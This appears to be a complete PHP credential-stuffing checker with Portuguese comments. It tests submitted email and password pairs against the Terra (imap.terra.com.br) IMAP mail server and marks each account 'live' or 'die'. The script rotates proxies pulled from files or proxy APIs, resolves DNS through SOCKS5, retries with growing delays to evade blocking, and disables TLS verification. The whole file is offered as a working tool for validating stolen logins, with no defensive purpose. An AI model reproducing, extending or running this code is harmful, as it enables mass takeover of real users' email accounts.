<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('max_execution_time', '120');
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? '';

if ($action === 'init') {
    $proxies = [];
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode("\n", $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            if (preg_match('/^https?:\/\/[^\/]+\/.+/i', $line)) {
                $apiProxies = fetchProxiesFromApi($line);
                if (!empty($apiProxies)) $proxies = array_merge($proxies, $apiProxies);
            } else {
                $proxies[] = $line;
            }
        }
    }
    echo json_encode(['status' => 'ok', 'proxies' => array_values(array_unique($proxies))]);
    exit;
}

if ($action === 'test_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) { echo json_encode(['status' => 'fail']); exit; }
    $ok = testProxyConnection($proxy);
    echo json_encode(['status' => $ok ? 'ok' : 'fail']);
    exit;
}

if ($action === 'check') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $proxy = $_POST['proxy'] ?? '';
    if ($email === '' || $password === '') {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }
    try {
        echo json_encode(doValidate($email, $password, $proxy));
    } catch (\Throwable $e) {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Erro']);
    }
    exit;
}

echo json_encode(['status' => 'ok']);
exit;

function fetchProxiesFromApi(string $url): array {
    $proxies = [];
    if (extension_loaded('curl')) {
        $ch = curl_init();
        curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_FOLLOWLOCATION => true, CURLOPT_NOSIGNAL => 1]);
        $result = curl_exec($ch);
        curl_close($ch);
    } else {
        $result = @file_get_contents($url);
    }
    if ($result !== false && !empty($result)) {
        $lines = array_filter(array_map('trim', explode("\n", $result)));
        foreach ($lines as $line) { if (!empty($line)) $proxies[] = trim($line); }
    }
    return $proxies;
}

function testProxyConnection(string $proxy): bool {
    if (!extension_loaded('curl')) return false;
    $ch = curl_init();
    $opts = [
        CURLOPT_URL => 'https://api.ipify.org/',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_NOSIGNAL => 1,
        CURLOPT_FOLLOWLOCATION => true,
    ];
    applyProxyOpts($proxy, $opts);
    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

// ═══════════════════════════════════════
//  CORREÇÃO PRINCIPAL: applyProxyOpts
//  CURLOPT_PROXY deve ser host:port SEM scheme
//  Usar CURLPROXY_SOCKS5_HOSTNAME para DNS remoto
// ═══════════════════════════════════════

function applyProxyOpts(string $proxy, array &$opts): void {
    if (empty($proxy)) return;

    $proxyLower = strtolower($proxy);

    // Determinar tipo
    if (strpos($proxyLower, 'socks5') === 0) {
        // CURLPROXY_SOCKS5_HOSTNAME = 7 (resolve DNS através do proxy)
        $opts[CURLOPT_PROXYTYPE] = defined('CURLPROXY_SOCKS5_HOSTNAME') ? CURLPROXY_SOCKS5_HOSTNAME : 7;
    } elseif (strpos($proxyLower, 'socks4') === 0) {
        $opts[CURLOPT_PROXYTYPE] = CURLPROXY_SOCKS4;
    } else {
        $opts[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
    }

    // Extrair user:pass e host:port
    $proxyHost = '';
    $proxyAuth = '';

    // socks5://user:pass@host:port
    if (preg_match('/^socks[45]h?:\/\/([^:@]+):([^@]+)@(.+)$/i', $proxy, $m)) {
        $proxyAuth = $m[1] . ':' . $m[2];
        $proxyHost = $m[3];
    }
    // http://user:pass@host:port
    elseif (preg_match('/^https?:\/\/([^:@]+):([^@]+)@(.+)$/i', $proxy, $m)) {
        $proxyAuth = $m[1] . ':' . $m[2];
        $proxyHost = $m[3];
    }
    // user:pass@host:port (sem scheme)
    elseif (preg_match('/^([^:@]+):([^@]+)@(.+)$/', $proxy, $m)) {
        $proxyAuth = $m[1] . ':' . $m[2];
        $proxyHost = $m[3];
    }
    // host:port (sem auth, sem scheme)
    else {
        $proxyHost = preg_replace('/^(socks[45]h?|https?):\/\//i', '', $proxy);
    }

    // CORREÇÃO: CURLOPT_PROXY recebe apenas host:port (SEM scheme)
    $opts[CURLOPT_PROXY] = $proxyHost;

    if (!empty($proxyAuth)) {
        $opts[CURLOPT_PROXYUSERPWD] = $proxyAuth;
    }
}

// ═══════════════════════════════════════
//  VALIDAÇÃO — SEMPRE COM PROXY
// ═══════════════════════════════════════

function doValidate(string $email, string $password, string $proxy = ''): array {
    $timeout = 20;
    $delays = [0, 3000000, 6000000, 10000000, 15000000];

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        // cURL com proxy (sempre)
        if (extension_loaded('curl')) {
            $r = tryCurl($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        // Socket direto apenas se não tiver proxy
        if (empty($proxy)) {
            $r = trySocket($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true];
}

function tryCurl(string $email, string $password, int $timeout, string $proxy = ''): ?array {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    $opts = [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME => $email,
        CURLOPT_PASSWORD => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL => 1,
    ];
    if (!empty($proxy)) { applyProxyOpts($proxy, $opts); }
    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

function trySocket(string $email, string $password, int $timeout): ?array {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}
